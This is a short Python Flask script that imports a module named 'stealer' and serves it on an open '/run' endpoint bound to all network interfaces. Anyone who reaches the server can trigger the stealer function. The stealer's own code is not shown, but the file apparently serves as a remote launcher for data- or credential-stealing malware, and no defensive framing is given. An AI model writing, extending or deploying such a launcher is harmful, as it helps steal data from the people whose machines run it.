from flask import Flask
import stealer

app = Flask(__name__)

@app.route("/run")
def execute():
    return stealer.stealer()

app.run(host="0.0.0.0", port=5000)